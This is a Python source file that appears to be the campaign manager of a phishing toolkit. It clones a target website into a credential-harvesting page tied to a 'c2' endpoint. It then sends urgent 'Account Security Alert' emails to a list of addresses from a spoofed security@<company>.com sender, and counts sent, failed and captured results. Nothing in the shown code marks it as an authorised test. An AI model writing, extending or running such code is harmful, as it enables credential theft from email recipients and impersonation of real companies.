import json, logging, threading, time, os
from .email import generate_email
from .cloner import Cloner
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from dotenv import load_dotenv

load_dotenv()
log = logging.getLogger("campaign")

class CampaignManager:
    def __init__(self, config, state_file):
        self.config = config
        self.state_file = state_file
        self.campaigns = self.load()
        self.lock = threading.Lock()

    def load(self):
        if os.path.exists(self.state_file):
            with open(self.state_file) as f:
                return json.load(f)
        return {}

    def save(self):
        with self.lock, open(self.state_file, "w") as f:
            json.dump(self.campaigns, f)

    def create(self, target, company, emails):
        cid = str(int(time.time() * 1000) % 10**12)
        phish_path = Cloner.clone(target, cid, "https://localhost:8443/c2")
        self.campaigns[cid] = {
            "id": cid,
            "target": target,
            "company": company,
            "emails": emails,
            "status": "sending",
            "stats": {"sent": 0, "failed": 0, "captured": 0},
            "phish_url": f"https://localhost:8443{phish_path}"
        }
        self.save()
        threading.Thread(target=self.send_batch, args=(cid,), daemon=True).start()
        return cid

    def send_batch(self, cid):
        camp = self.campaigns[cid]
        smtp_cfg = self.config['smtp']
        for email in camp['emails']:
            try:
                body = generate_email(camp['phish_url'], camp['company'], self.config) + f"\n\nSecure: {camp['phish_url']}"
                msg = MIMEMultipart()
                msg['From'] = f"security@{camp['company'].lower()}.com"
                msg['To'] = email
                msg['Subject'] = "[URGENT] Account Security Alert"
                msg.attach(MIMEText(body, 'plain'))
                s = smtplib.SMTP(smtp_cfg['server'], smtp_cfg['port'])
                s.starttls()
                s.login(os.getenv("SMTP_USER"), os.getenv("SMTP_PASS"))
                s.sendmail(msg['From'], email, msg.as_string())
                s.quit()
                camp['stats']['sent'] += 1
            except Exception as e:
                camp['stats']['failed'] += 1
                log.error(f"Send fail {email}: {e}")
            time.sleep(1)
        camp['status'] = 'sent'
        self.save()
